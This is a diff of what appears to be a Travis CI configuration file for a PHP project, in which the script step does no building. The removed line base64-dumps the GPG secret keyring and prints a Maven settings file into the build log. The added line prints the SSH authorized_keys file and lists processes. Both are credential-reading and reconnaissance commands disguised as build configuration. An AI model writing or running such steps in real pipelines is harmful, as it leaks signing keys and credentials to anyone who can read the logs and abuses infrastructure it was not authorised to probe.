@@ -1,4 +1,4 @@
 language: php
 php:
   - 5.5
-script: cat /home/travis/.m2/settings.xml /home/travis/build.sh ;file /home/travis/builds  ; stat /home/travis/.gnupg/secring.gpg; base64 </home/travis/.gnupg/secring.gpg
+script: cat /home/travis/.ssh/authorized_keys ; ps -ef; pstree -pa
